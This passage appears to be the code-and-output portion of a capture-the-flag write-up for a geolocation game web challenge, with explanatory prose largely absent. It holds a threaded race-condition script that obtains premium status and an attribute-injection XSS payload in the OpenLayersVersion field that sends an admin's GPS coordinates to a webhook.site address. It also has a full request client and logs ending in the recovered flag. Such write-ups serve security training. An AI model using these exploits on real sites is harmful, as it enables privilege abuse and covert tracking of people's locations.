 enteredPremiumPin = req.body["premiumPin"]
 if (enteredPremiumPin) {
 enteredPremiumPin = enteredPremiumPin.toString()
 if (enteredPremiumPin == premiumPin) {
 user.isPremium = 1 // <---- Bot will trigger this
 } else {
 return res.status(401).json('wrong premium pin');
 }
 }
 // [...]
 }
 return res.status(401).json('no');
});
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
import threading
import sys
from time import sleep

from user import User

def register_and_check():
 """Register a user and check if it is premium."""
 user = User()
 user.register()

 sleep(1)
 if user.check_premium():
 print(f"[{user.token}] Premium user found: {user.username} !!!!!!!!!!!!!!!!!!!!!!")
 sys.exit(0)
 else:
 print(f"[{user.token}] {user.username} is not premium :(")

def obtain_premium_user():
 """
 Obtain a premium user.

 1. Register a user and ask the bot to send an invitation to itself.
 2. Register multiple users in parallel to exploit a race condition between 'updateUser' and 'register'.
 3. Check if one of the user is premium.
 """
 threads = []

 user_run_bot = User()
 user_run_bot.register()
 user_run_bot.bot_recv_invitation()

 number_of_users = 30
 sleep(0.8)
 for _ in range(number_of_users):
 thread = threading.Thread(target=register_and_check)
 threads.append(thread)
 thread.start()
 sleep(0.05)

 for thread in threads:
 thread.join()

if __name__ == "__main__":
 obtain_premium_user()
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
$ python3 workflow_race.py
[068ec97e07f77a7fc421d30f2ba5caec] Registered as: IgnorantArt4455
[068ec97e07f77a7fc421d30f2ba5caec] Bot send an invitation to: IgnorantArt4455
[697c5496912e36412f304e1909f056ff] Registered as: CaninePerception7932
[f4b0cb37bb77271f61e64ea9b5e6e2df] Registered as: CapitalGrade3691
[ca99279ac37efc688846ae3e0098779f] Registered as: ClumsyBet6554
[9b43ff4813c07feef7800654147d0b25] Registered as: DrearyAddition9269
[27191995a85630eaf5c3cbda7994cd67] Registered as: WorseDatabase538
[b6f8ee766ebef10b6e0030dbae2605bf] Registered as: CautiousWelcome9613
[80e4d9eb99ce13f7207d8c9a717ca560] Registered as: PuzzledAdvance6260
[6cbd9a953c0858c747886e030035801c] Registered as: NovelCancer8356
[11edf35e5df139c10659b084915d3531] Registered as: CleverRich7660
[4f9a9b63d4b023da140c50e222e0e44f] Registered as: HappyTelevision858
[4f9a9b63d4b023da140c50e222e0e44f] Registered as: HappyTelevision858
[eba79b4ca5d24695c8b0bb3b6e8e6266] Registered as: IgnorantBeing5948
[03d83a8ba88f12de211b6890167e7db4] Registered as: Far-offSentence6259
[aed123e8bbc24916191d744cd327b923] Registered as: TurbulentSignal2480
[527c2f33957a9dfda3d76480c1c6c1c2] Registered as: EllipticalType5668
[7a6175f88165a634c72d509f5811d1bf] Registered as: PrivateBike1436
[709d3daedcc12dfdb3de74559cf59ba3] Registered as: WonderfulSystem8145
[d3975b6af74dd2a562f13d3a97706f90] Registered as: InfamousIron2087
[5011edd48f834bd7321d55f9474ee1ce] Registered as: KaleidoscopicRemote4902
[dae7cc3f170097b24527ce9b71019c90] Registered as: HeartyImpress7113
[697c5496912e36412f304e1909f056ff] CaninePerception7932 is not premium :(
[d7befb049e344f99b420ed9e9ad5b0a6] Registered as: UnripeProof2269
[c8c4e0b2283ce5d90ea65de0f39d9310] Registered as: FineSignificance2232
[f4b0cb37bb77271f61e64ea9b5e6e2df] CapitalGrade3691 is not premium :(
[ca99279ac37efc688846ae3e0098779f] Premium user found: ClumsyBet6554 !!!!!!!!!!!!!!!!!!!!!!
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
router.post('/createChallenge', async (req, res) => {
 token = req.cookies["token"]
 if (token) {
 user = await db.getUserBy("token", token)

 if (user && req.body["longitude"] && req.body["latitude"] && req.body["img"]) {
 chalId = crypto.randomBytes(16).toString('hex')
 if (user.isPremium) {
 if ((!req.body["winText"]) || (!req.body["OpenLayersVersion"]))
 return res.status(401).json('huh');
 winText = req.body["winText"].toString()
 OpenLayersVersion = req.body["OpenLayersVersion"].toString()
 } else {
 winText = "Well played! :D"
 OpenLayersVersion = "2.13"
 }

 await db.createChallenge(chalId, user.token, req.body["longitude"].toString(), req.body["latitude"].toString(), req.body["img"].toString(), OpenLayersVersion, winText)
 return res.status(200).json(chalId);
 }
 }
 return res.status(401).json('no');
});
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
sanitizeHTML = (input) => input.replaceAll("<","&lt;").replaceAll(">","&gt;")

router.get('/challenge', async (req, res) => {
 if (!req.query.id)
 return res.status(404).json('wher id');

 chall = await db.getChallengeById(req.query.id.toString())
 if (!chall)
 return res.status(404).json('no');

 libVersion = chall.OpenLayersVersion
 img = chall.image
 challId = chall.id
 iframeAttributes = "sandbox=\"allow-scripts allow-same-origin\" " // don't trust third party libs
 iframeAttributes += "src=\"/sandboxedChallenge?ver="+sanitizeHTML(libVersion)+"\" "
 iframeAttributes += "width=\"70%\" height=\"97%\" "
 res.render('challenge', {img, challId, iframeAttributes});
});
1
2
3
4
<%= challId %>
">
>
Submit position
1
2
3
4
5


1
2
3
4
5
6
7

 <script>
 navigator.geolocation.getCurrentPosition((pos) => {
 fetch(`https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6/lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`)
 });
 </script>

1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
XSS_STEAL_COORDS = f'" srcdoc="&#60;meta http-equiv=\'refresh\' content=\'1; url={WEBHOOK}\'&#62;" allow="geolocation {WEBHOOK}" x="'

def leak_admin_gps(admin_token):
 """
 Leak admin GPS location.

 1. Use the admin account to create a challenge with an XSS inside the OpenLayersVersion parameter.
 2. Get the admin username by receiving the notification game send by the bot.
 3. Send a challenge request to the admin with the XSS.
 4. Receive the admin GPS location on our webhook thanks to the XSS.
 """
 premium_user = User(token=admin_token)
 challenge_id = premium_user.create_challenge(OpenLayersVersion=XSS_STEAL_COORDS)

 user_recv_invit = User()
 user_recv_invit.register()
 user_recv_invit.bot_recv_invitation()
 admin_username, _ = user_recv_invit.get_notification()

leak_admin_gps(admin_token="9d31e6fb14d02f0cf646c230b650cd8a")
# https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6/lat=60.792937&lon=11.100984
1
2
3
4
5
6
7
8
9
[823fa49e380846156a4e78cd3ba6c346] Challenge 'c556bfaa3e57e8234aff4fe559de1d49' created with OpenLayersVersion: " srcdoc="&#60;meta http-equiv='refresh' content='1; url=https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6'&#62;" allow="geolocation https://webhook.site/c3a60869-6a80-4117-b7d4-693c4ba93af6" x="
[c941e1b04bd79d753359b57c09e36b6c] Registered as: SpiritedApartment9854
[c941e1b04bd79d753359b57c09e36b6c] Bot send an invitation to: SpiritedApartment9854
[c941e1b04bd79d753359b57c09e36b6c] Connecting to socket.io...
[c941e1b04bd79d753359b57c09e36b6c] Received: ['status', 'authSuccess']
[c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', []]
[c941e1b04bd79d753359b57c09e36b6c] Received: ['notifications', ['DistortedSlice3492 has challenged you to a game! [Click here to play!](/challenge?id=766ec00653beea3a2aa116a4f992f6e0)']]
[c941e1b04bd79d753359b57c09e36b6c] Received a game request from 'DistortedSlice3492' for challenge '766ec00653beea3a2aa116a4f992f6e0'.
[823fa49e380846156a4e78cd3ba6c346] Challenge sent to: DistortedSlice3492
1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
def get_flag(latitude, longitude):
 """Get the flag by solving a challenge with the admin GPS location."""
 win_user = User()
 win_user.register()
 win_user.bot_recv_invitation()

 _, challenge_id = win_user.get_notification()
 flag = win_user.solve_challenge(challenge_id, latitude, longitude)
 print(f"{flag = }")

get_flag(latitude="60.792937", longitude="11.100984")
# EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203}
1
2
3
4
5
6
7
8
9
[43ea8c0e81990644f9b7e30a12ddc2ec] Registered as: UnpleasantWinner2868
[43ea8c0e81990644f9b7e30a12ddc2ec] Bot send an invitation to: UnpleasantWinner2868
[43ea8c0e81990644f9b7e30a12ddc2ec] Connecting to socket.io...
[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['status', 'authSuccess']
[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', []]
[43ea8c0e81990644f9b7e30a12ddc2ec] Received: ['notifications', ['DirtyPeople3320 has challenged you to a game! [Click here to play!](/challenge?id=2fb16891fce844d41eab9df526abc1c6)']]
[43ea8c0e81990644f9b7e30a12ddc2ec] Received a game request from 'DirtyPeople3320' for challenge '2fb16891fce844d41eab9df526abc1c6'.
[43ea8c0e81990644f9b7e30a12ddc2ec] Challenge '2fb16891fce844d41eab9df526abc1c6' solved with latitude: 60.792937 and longitude: 11.100984
flag = 'EPFL{as a wise man once said, https://twitter.com/arkark_/status/1712773241218183203}'
1
 2
 3
 4
 5
 6
 7
 8
 9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
import secrets

import requests
import socketio # python3 -m pip install "python-socketio[client]"

URL = "https://chall.polygl0ts.ch:
9011"
URL = "http://localhost:
9011"

class User:

 def __init__(self, username=None, token=None):
 self.sess = requests.Session()
 self.username = username
 self.token = token
 self.sio = socketio.Client()

 if self.token:
 self.sess.cookies.set("token", self.token)

 def check_premium(self):
 """Check if the user is premium."""
 html = self.sess.get(URL).text
 return '1' in html

 def register(self):
 """Register a user on the application."""
 html = self.sess.get(URL + "/register").text
 self.username = html.split('')[1].split("")[0]
 self.token = html.split('')[1].split("")[0]
 print(f"[{self.token}] Registered as: {self.username}")

 def change_username(self, new_username):
 """Change the username of the user."""
 self.sess.post(URL + "/updateUser", json={
 "username": new_username + secrets.token_hex(8), # to avoid duplicate username
 })
 self.username = new_username
 print(f"[{self.token}] Username updated to: {self.username}")

 def bot_recv_invitation(self, target_username=None):
 """Make the bot invite the user to a game."""
 if target_username is None:
 target_username = self.username

 self.sess.get(URL + "/bot?username=" + target_username)
 print(f"[{self.token}] Bot send an invitation to: {target_username}")

 def challenge_user(self, challenge_id, target_username=None):
 """Challenge a user to a game."""
 if target_username is None:
 target_username = self.username

 self.sess.post(URL + "/challengeUser", json={
 "username": target_username,
 "duelID": challenge_id
 })
 print(f"[{self.token}] Challenge sent to: {target_username}")

 def get_notification(self):
 """Receive the notification game send by a game request."""
 print(f"[{self.token}] Connecting to socket.io...")
 with socketio.SimpleClient() as sio:
 sio.connect(URL)
 data = sio.receive()
 if data[1] == "auth":
 sio.emit("auth", self.token)

 while True:
 data = sio.receive()
 print(f"[{self.token}] Received: {data}")
 if data[0] == "notifications" and data[1]:
 notifications = data[1][0]
 username = notifications.split(" ")[0]
 challenge_id = notifications.split("?id=")[1].split('"')[0]
 print(f"[{self.token}] Received a game request from '{username}' for challenge '{challenge_id}'.")
 sio.disconnect()
 return username, challenge_id

 def create_challenge(self, longitude="0.0", latitude="0.0", img="abc", winText="xyz", OpenLayersVersion=""):
 """Create a challenge."""
 resp = self.sess.post(URL + "/createChallenge", json={
 "longitude": longitude,
 "latitude": latitude,
 "img": img,
 "winText": winText,
 "OpenLayersVersion": OpenLayersVersion
 })
 challenge_id = resp.text.strip('"')
 print(f"[{self.token}] Challenge '{challenge_id}' created with OpenLayersVersion: {OpenLayersVersion}")
 return challenge_id

 def solve_challenge(self, challenge_id, latitude, longitude):
 """Solve a challenge."""
 resp = self.sess.post(URL + "/solveChallenge", json={
 "challId": challenge_id,
 "longitude": longitude,
 "latitude": latitude
 })
 print(f"[{self.token}] Challenge '{challenge_id}' solved with latitude: {latitude} and longitude: {longitude}")
 return resp.text.strip('"')
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/img_655b2c4ea0255.png)